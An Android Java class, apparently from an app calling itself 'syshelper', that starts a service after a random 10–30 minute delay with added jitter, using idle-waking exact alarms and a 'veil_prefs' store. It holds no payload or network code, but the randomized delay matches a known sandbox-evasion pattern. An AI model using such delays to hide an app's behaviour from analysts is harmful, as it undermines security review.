package com.syshelper.service;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;
import java.util.concurrent.ThreadLocalRandom;

public class DelayedStart {
    private static final String TAG = "DelayedStart";
    private static final String PREFS_NAME = "veil_prefs";
    private static final String KEY_DELAY_START_TIME = "delay_start_time";

    public static void scheduleDelayedStart(Context ctx, Class<?> serviceClass) {
        android.content.SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        long scheduledTime = prefs.getLong(KEY_DELAY_START_TIME, 0);
        if (scheduledTime == 0) {
            int delayMinutes = ThreadLocalRandom.current().nextInt(10, 31);
            int jitterSeconds = ThreadLocalRandom.current().nextInt(0, 120);
            long delayMs = (delayMinutes * 60_000L) + (jitterSeconds * 1_000L);
            scheduledTime = SystemClock.elapsedRealtime() + delayMs;
            prefs.edit().putLong(KEY_DELAY_START_TIME, scheduledTime).apply();
            Log.d(TAG, "Delay scheduled: " + delayMinutes + "m " + jitterSeconds + "s");
        }
        long now = SystemClock.elapsedRealtime();
        long remaining = scheduledTime - now;
        if (remaining <= 0) {
            Log.d(TAG, "Delay expired, starting service");
            prefs.edit().remove(KEY_DELAY_START_TIME).apply();
            startService(ctx, serviceClass);
        } else {
            Intent intent = new Intent(ctx, serviceClass);
            intent.putExtra("delayed_start", true);
            PendingIntent pendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                pendingIntent = PendingIntent.getForegroundService(ctx, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            } else {
                pendingIntent = PendingIntent.getService(ctx, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
            }
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (am.canScheduleExactAlarms()) am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, scheduledTime, pendingIntent);
                else am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, scheduledTime, pendingIntent);
            } else {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, scheduledTime, pendingIntent);
            }
        }
    }

    private static void startService(Context ctx, Class<?> serviceClass) {
        Intent svc = new Intent(ctx, serviceClass);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(svc);
        else ctx.startService(svc);
    }
}
